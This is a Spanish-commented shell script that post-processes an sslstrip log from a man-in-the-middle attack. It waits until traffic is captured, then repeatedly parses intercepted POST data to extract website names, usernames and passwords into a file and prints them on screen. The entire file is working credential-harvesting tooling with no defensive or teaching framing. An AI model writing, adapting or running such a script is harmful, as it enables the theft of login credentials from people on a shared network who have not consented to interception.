#!/bin/sh

TMP="tmp"

esperar_a_capturar_algo()
{
CONTENIDO_ARCHIVO=$(cat "$TMP/sslstrip.log")
while [ "$CONTENIDO_ARCHIVO" = "" ] #espera a que se capture algo
do
	sleep 1
	CONTENIDO_ARCHIVO=$(cat "$TMP/sslstrip.log")
done
}

crear_archivo_claves()
{
rm -rf "$TMP/claves_ssl.txt" >/dev/null 2>&1
CONTENIDO_ARCHIVO=$(cat "$TMP/sslstrip.log")
let LINEAS=$(echo "$CONTENIDO_ARCHIVO" | wc -l)
let CONT=1
while [ $CONT -le $LINEAS ]
do
	FILA=$(echo "$CONTENIDO_ARCHIVO" | sed -n ${CONT}p)
	WEB=$(echo "$FILA" | grep "POST Data")
	USUARIO=$(echo "$FILA" | grep -e "email=" -e "login=" -e "name=" -e "nickname=" -e "user=")
	CLAVE=$(echo "$FILA" | grep -e "pass=" -e "passwd=" -e "pw=" -e "passwrd=")
	if [ "$WEB" != "" ] #comprobamos si la línea actual tiene la web
	then
		WEB=$(echo "$FILA" | awk -F '(' '{print $2}' | awk -F ')' '{print $1}')
		echo "" >> "$TMP/claves_ssl.txt"
		echo "Web..........: $WEB" >> "$TMP/claves_ssl.txt"
	fi
	if [ "$USUARIO" != "" ] #comprobamos si la línea actual tiene el usuario
	then
		USUARIO=$(echo "$FILA" | awk -F 'email=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%40/@/' | sed 's/+/ /g')
		if [ "$USUARIO" = "" ]
		then
			USUARIO=$(echo "$FILA" | awk -F 'login=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%40/@/' | sed 's/+/ /g')
		fi
		if [ "$USUARIO" = "" ]
		then
			USUARIO=$(echo "$FILA" | awk -F 'name=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%40/@/' | sed 's/+/ /g')
		fi
		if [ "$USUARIO" = "" ]
		then
			USUARIO=$(echo "$FILA" | awk -F 'nickname=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%40/@/' | sed 's/+/ /g')
		fi
		if [ "$USUARIO" = "" ]
		then
			USUARIO=$(echo "$FILA" | awk -F 'user=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/%40/@/' | sed 's/+/ /g')
		fi
		echo "Usuario......: $USUARIO" >> "$TMP/claves_ssl.txt"
	fi
	if [ "$CLAVE" != "" ] #comprobamos si la línea actual tiene la contraseña
	then
		CLAVE=$(echo "$FILA" | awk -F 'pass=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/+/ /g')
		if [ "$CLAVE" = "" ]
		then
			CLAVE=$(echo "$FILA" | awk -F 'passwrd=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/+/ /g')
		fi
		if [ "$CLAVE" = "" ]
		then
			CLAVE=$(echo "$FILA" | awk -F 'passwd=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/+/ /g')
		fi
		if [ "$CLAVE" = "" ]
		then
			CLAVE=$(echo "$FILA" | awk -F 'pw=' '{print $2}' | awk -F '&' '{print $1}' | sed 's/+/ /g')
		fi
		echo "Contraseña...: $CLAVE" >> "$TMP/claves_ssl.txt"
	fi
	let CONT=$CONT+1
done
}

mostrar_claves()
{
clear
cat "$TMP/claves_ssl.txt"
}


### PROGRAMA PRINCIPAL ###

esperar_a_capturar_algo
while true
do
	crear_archivo_claves
	mostrar_claves
	sleep 1
done
